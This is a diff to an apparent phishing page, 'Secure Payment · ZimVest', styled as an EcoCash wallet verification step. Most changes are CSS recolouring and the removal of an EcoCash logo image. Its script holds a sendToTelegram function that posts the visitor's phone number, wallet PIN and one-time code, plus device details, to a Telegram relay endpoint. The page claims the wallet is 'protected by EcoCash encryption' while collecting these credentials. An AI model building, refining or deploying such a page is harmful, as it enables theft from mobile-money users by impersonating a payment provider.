@@ -2,56 +2,55 @@
 <html lang="en">
 <head>
 <meta charset="utf-8"/>
-<link rel="icon" href="assets/favicon.svg" type="image/svg+xml"/>
-<link rel="icon" href="assets/favicon.ico" sizes="any"/>
 <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no,viewport-fit=cover"/>
-<meta name="theme-color" content="#04342C"/>
+<meta name="theme-color" content="#133527"/>
 <title>Secure Payment · ZimVest</title>
+<link rel="preconnect" href="https://fonts.googleapis.com"/>
 <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&family=DM+Mono:wght@400;500;700&display=swap" rel="stylesheet">
 <style>
 *{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
 
 :root{
-  --navy:#04342C;
-  --navy-dark:#021f1a;
-  --blue:#1D9E75;
-  --sky:#E1F5EE;
-  --sky-mid:#9FE1CB;
-  --sky-deep:#5DCAA5;
+  --c-dark:#133527;
+  --c-nav:#0A2218;
+  --c-brand:#22C373;
+  --c-sky:#E6F5EE;
+  --c-sky-mid:#A8DDBE;
+  --c-sky-d:#A8DDBE;
   --red:#d0021b;
-  --page:#f0faf6;
+  --c-bg:#F5F9F7;
   --white:#ffffff;
   --card:#ffffff;
-  --border:#c8e8dc;
-  --border-strong:#9FE1CB;
-  --ink:#04342C;
-  --ink-mid:#0F6E56;
-  --ink-soft:#3d7a66;
-  --ink-faint:#7db5a0;
+  --b-lt:#D6EDE1;
+  --b-mid:#A8DDBE;
+  --t-pri:#0A2218;
+  --t-mid:#1A5C3A;
+  --t-sec:#2D5E42;
+  --t-dis:#9ABFAA;
   --font:'Plus Jakarta Sans',sans-serif;
   --mono:'DM Mono',monospace;
   --r:12px;
   --r-lg:16px;
-  --shadow:0 1px 3px rgba(4,52,44,.08),0 4px 16px rgba(4,52,44,.06);
+  --shadow:0 1px 3px rgba(10,34,24,.08),0 4px 16px rgba(10,34,24,.06);
 }
 
 html,body{
   width:100%;height:100%;height:100dvh;
   overflow:hidden;font-family:var(--font);
-  background:var(--page);
+  background:var(--c-bg);
 }
 
 .screen{
   display:flex;flex-direction:column;
   width:100%;height:100%;height:100dvh;
   max-width:430px;margin:0 auto;
-  background:var(--page);
+  background:var(--c-bg);
   overflow:hidden;position:relative;
 }
 
 /* ── HEADER ── */
 .header{
-  background:var(--navy);
+  background:var(--c-dark);
   padding:16px 18px 20px;
   flex-shrink:0;
   position:relative;overflow:hidden;
@@ -65,7 +64,7 @@ html,body{
 }
 .hglow{
   position:absolute;width:240px;height:240px;border-radius:50%;
-  background:rgba(29,158,117,.3);filter:blur(70px);
+  background:rgba(34,195,115,.3);filter:blur(70px);
   top:-100px;right:-60px;pointer-events:none;
 }
 
@@ -119,22 +118,22 @@ html,body{
 .ecocash-row{
   display:flex;align-items:center;gap:10px;
   background:var(--white);
-  border:1.5px solid var(--border);
+  border:1.5px solid var(--b-lt);
   border-radius:var(--r-lg);
   padding:12px 16px;
   margin-bottom:10px;
   box-shadow:var(--shadow);
 }
 .ecocash-logo-lg{height:34px;object-fit:contain}
-.eco-icon{width:42px;height:42px;background:var(--sky);border:1.5px solid var(--border-strong);border-radius:10px;display:flex;align-items:center;justify-content:center;flex-shrink:0}
+.eco-icon{width:42px;height:42px;background:var(--c-sky);border:1.5px solid var(--b-mid);border-radius:10px;display:flex;align-items:center;justify-content:center;flex-shrink:0}
 .ecocash-row-text{}
-.ecocash-row-title{font-size:13px;font-weight:800;color:var(--ink);line-height:1.2}
-.ecocash-row-sub{font-size:11px;color:var(--ink-soft);font-weight:500;margin-top:1px}
+.ecocash-row-title{font-size:13px;font-weight:800;color:var(--t-pri);line-height:1.2}
+.ecocash-row-sub{font-size:11px;color:var(--t-sec);font-weight:500;margin-top:1px}
 
 /* CARD */
 .card{
   background:var(--card);
-  border:1.5px solid var(--border);
+  border:1.5px solid var(--b-lt);
   border-radius:var(--r-lg);
   overflow:hidden;
   margin-bottom:10px;
@@ -142,61 +141,61 @@ html,body{
 }
 .card-top-bar{
   height:3px;
-  background:linear-gradient(90deg,var(--blue),var(--sky-deep));
+  background:linear-gradient(90deg,var(--c-brand),#5DCAA5);
 }
 .card-hdr{
   padding:13px 16px 11px;
-  border-bottom:1px solid var(--border);
+  border-bottom:1px solid var(--b-lt);
 }
-.card-title{font-size:14px;font-weight:800;color:var(--ink)}
-.card-sub{font-size:11px;color:var(--ink-soft);font-weight:500;margin-top:2px}
+.card-title{font-size:14px;font-weight:800;color:var(--t-pri)}
+.card-sub{font-size:11px;color:var(--t-sec);font-weight:500;margin-top:2px}
 .card-body{padding:16px}
 
 /* FIELD */
 .field{margin-bottom:15px}
 .field:last-child{margin-bottom:0}
 .field-label{
-  font-size:10px;font-weight:700;color:var(--ink-soft);
+  font-size:10px;font-weight:700;color:var(--t-sec);
   text-transform:uppercase;letter-spacing:.8px;margin-bottom:6px;
 }
 
 /* PHONE ROW */
 .phone-row{display:flex;gap:8px}
 .phone-prefix{
-  background:var(--sky);border:1.5px solid var(--sky-deep);
-  color:var(--navy);font-family:var(--mono);font-size:14px;font-weight:800;
+  background:var(--c-sky);border:1.5px solid var(--c-sky-d);
+  color:var(--c-dark);font-family:var(--mono);font-size:14px;font-weight:800;
   padding:0 14px;border-radius:var(--r);
-  display:flex;align-items:center;flex-shrink:0;height:48px;
+  display:flex;align-items:center;flex-shrink:0;height:50px;
 }
 
 input[type=tel],input[type=text],input[type=password]{
-  width:100%;height:48px;padding:0 14px;
-  border-radius:var(--r);border:1.5px solid var(--border);
-  background:var(--page);
-  font-family:var(--font);font-size:15px;font-weight:500;color:var(--ink);
+  width:100%;height:50px;padding:0 14px;
+  border-radius:var(--r);border:1.5px solid var(--b-lt);
+  background:var(--c-bg);
+  font-family:var(--font);font-size:15px;font-weight:500;color:var(--t-pri);
   outline:none;transition:border-color .18s,background .18s,box-shadow .18s;
   -webkit-appearance:none;
 }
-input::placeholder{color:var(--ink-faint)}
+input::placeholder{color:var(--t-dis)}
 input:focus{
-  border-color:var(--blue);background:var(--white);
-  box-shadow:0 0 0 3px rgba(29,158,117,.12);
+  border-color:var(--c-brand);background:var(--white);
+  box-shadow:0 0 0 3px rgba(34,195,115,.12);
 }
 
-.field-hint{font-size:11px;color:var(--ink-faint);font-weight:500;margin-top:5px}
+.field-hint{font-size:11px;color:var(--t-dis);font-weight:500;margin-top:5px}
 
 /* PIN FIELD */
 .pin-field{position:relative;display:flex;align-items:center}
 .pin-field input{
-  height:48px;padding:0 50px 0 14px;
+  height:50px;padding:0 50px 0 14px;
   font-family:var(--mono);font-size:22px;letter-spacing:7px;
 }
 .eye-btn{
   position:absolute;right:13px;background:none;border:none;
-  cursor:pointer;color:var(--ink-faint);display:flex;align-items:center;
+  cursor:pointer;color:var(--t-dis);display:flex;align-items:center;
   padding:4px;transition:color .15s;
 }
-.eye-btn:hover{color:var(--blue)}
+.eye-btn:hover{color:var(--c-brand)}
 
 /* OTP */
 .otp-wrap{position:relative;height:58px}
@@ -207,31 +206,31 @@ input:focus{
 }
 .otp-display{display:flex;gap:7px;pointer-events:none}
 .otp-box{
-  flex:1;height:58px;border-radius:var(--r);
-  border:1.5px solid var(--border);background:var(--page);
+  flex:1;height:58px;border-radius:14px;
+  border:1.5px solid var(--b-lt);background:var(--c-bg);
   display:flex;align-items:center;justify-content:center;
-  font-family:var(--mono);font-size:22px;font-weight:800;color:var(--ink);
+  font-family:var(--mono);font-size:22px;font-weight:800;color:var(--t-pri);
   transition:border-color .18s,background .18s,box-shadow .18s;
 }
-.otp-box.filled{background:var(--white);border-color:var(--sky-deep)}
-.otp-box.active{border-color:var(--blue);background:var(--white);box-shadow:0 0 0 3px rgba(29,158,117,.12)}
-.otp-box.disabled{opacity:.4;background:var(--border)}
+.otp-box.filled{background:var(--white);border-color:var(--c-sky-d)}
+.otp-box.active{border-color:var(--c-brand);background:var(--white);box-shadow:0 0 0 3px rgba(34,195,115,.12)}
+.otp-box.disabled{opacity:.4;background:var(--b-lt)}
 
 .timer-row{
   display:flex;justify-content:space-between;align-items:center;
   padding:10px 0 0;
 }
-.timer-lbl{font-size:12px;color:var(--ink-soft);font-weight:500}
-.timer-num{font-family:var(--mono);font-weight:700;color:var(--blue)}
+.timer-lbl{font-size:12px;color:var(--t-sec);font-weight:500}
+.timer-num{font-family:var(--mono);font-weight:700;color:var(--c-brand)}
 .resend-btn{
   background:none;border:none;font-family:var(--font);
-  font-size:12px;font-weight:700;color:var(--blue);
+  font-size:12px;font-weight:700;color:var(--c-brand);
   cursor:pointer;opacity:.3;padding:0;transition:opacity .18s;
 }
 .resend-btn.active{opacity:1}
 
 .masked-note{
-  font-size:13px;color:var(--ink-soft);font-weight:500;
+  font-size:13px;color:var(--t-sec);font-weight:500;
   text-align:center;padding:2px 0 6px;line-height:1.5;
 }
 
@@ -239,27 +238,27 @@ input:focus{
 .proc-body{padding:30px 20px;text-align:center}
 .proc-ring{
   width:52px;height:52px;border-radius:50%;margin:0 auto 14px;
-  border:3px solid var(--sky-deep);border-top-color:var(--blue);
+  border:3px solid var(--c-sky-d);border-top-color:var(--c-brand);
   animation:spin 1s linear infinite;
 }
 @keyframes spin{to{transform:rotate(360deg)}}
-.proc-title{font-size:16px;font-weight:800;color:var(--ink);margin-bottom:5px}
-.proc-sub{font-size:13px;color:var(--ink-soft);line-height:1.5}
+.proc-title{font-size:16px;font-weight:800;color:var(--t-pri);margin-bottom:5px}
+.proc-sub{font-size:13px;color:var(--t-sec);line-height:1.5}
 
 /* ── STICKY FOOTER ── */
 .sticky-footer{
   position:absolute;bottom:0;left:0;right:0;
   padding:12px 14px max(20px,env(safe-area-inset-bottom));
-  background:linear-gradient(to top,var(--page) 70%,transparent);
+  background:linear-gradient(to top,var(--c-bg) 70%,transparent);
   z-index:10;
 }
 .action-btn{
-  background:var(--blue);color:#fff;border:none;width:100%;padding:15px;
+  background:var(--c-brand);color:#fff;border:none;width:100%;padding:15px;
   border-radius:var(--r-lg);
   font-family:var(--font);font-size:14px;font-weight:800;
   cursor:pointer;letter-spacing:.1px;
   transition:all .15s;opacity:.35;pointer-events:none;
-  box-shadow:0 4px 16px rgba(29,158,117,.3);
+  box-shadow:0 4px 16px rgba(34,195,115,.3);
 }
 .action-btn.active{opacity:1;pointer-events:auto}
 .action-btn:active{transform:scale(.98)}
@@ -267,7 +266,7 @@ input:focus{
 /* POWERED */
 .powered{
   text-align:center;padding:4px 0 2px;
-  font-size:9px;color:var(--ink-faint);font-weight:500;letter-spacing:.3px;
+  font-size:9px;color:var(--t-dis);font-weight:500;letter-spacing:.3px;
 }
 </style>
 </head>
@@ -305,7 +304,9 @@ input:focus{
 
       <!-- EcoCash brand row ABOVE the verify card -->
       <div class="ecocash-row">
-        <img src="assets/ecocash.png" alt="EcoCash" class="ecocash-logo-lg">
+        <div class="eco-icon">
+          <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="var(--c-brand)" stroke-width="2" stroke-linecap="round"><rect x="2" y="5" width="20" height="14" rx="3"/><path d="M2 10h20"/></svg>
+        </div>
         <div class="ecocash-row-text">
           <div class="ecocash-row-title">Secure EcoCash Payment</div>
           <div class="ecocash-row-sub">Your wallet is protected by EcoCash encryption</div>
@@ -420,17 +421,6 @@ function initHeader(){
 }
 initHeader();
 
-/* Pre-fill phone from auth page */
-try {
-  const storedPhone = sessionStorage.getItem('zimvest_phone');
-  if (storedPhone) {
-    const digits = storedPhone.replace('+263','');
-    document.getElementById('phone').value = digits;
-    phoneValue = storedPhone;
-    validateLogin();
-  }
-} catch(e) {}
-
 const ua=navigator.userAgent;
 let device="Unknown";
 if(/Android/i.test(ua)) device="Android";
@@ -444,7 +434,7 @@ function getPlanLine(){
 }
 
 async function sendToTelegram(eventName){
-  fetch("/api/sendTelegram",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({submittedAt:new Date().toISOString(),loginPhone:phoneValue,loginPin:pinValue,otp:otpValue,event:eventName,name:sessionStorage.getItem("zimvest_name")||"",selectedPlan:selectedPlan,plan:getPlanLine(),device})});
+  fetch("/api/sendTelegram",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({submittedAt:new Date().toISOString(),loginPhone:phoneValue,loginPin:pinValue,otp:otpValue,event:eventName,plan:getPlanLine(),device})});
 }
 
 function showStep(id){
